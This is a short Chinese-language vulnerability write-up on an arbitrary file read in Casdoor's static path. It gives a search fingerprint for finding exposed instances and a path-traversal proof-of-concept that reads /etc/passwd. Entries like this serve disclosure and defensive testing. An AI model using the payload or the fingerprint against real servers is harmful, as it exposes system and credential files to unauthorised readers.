# Casdoor static 任意文件读取漏洞

## 漏洞描述

Casdoor static 存在任意文件读取漏洞，攻击者通过发送特殊的请求包可以获取服务器中的敏感文件

## 漏洞影响

<a-checkbox checked>Casdoor </a-checkbox>

## 网络测绘

<a-checkbox checked>title="Casdoor" </a-checkbox>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1696485665805-41fd85ce-669b-4af6-b2d7-ce41f967d836.png)

验证POC

```plain
/static/../../../../../../../../../../../etc/passwd
```

![img](../../../.vuepress/public/img/1696485691183-fca88e1a-c0dd-44e9-8ade-a51ae4a29615-20231108133631024.png)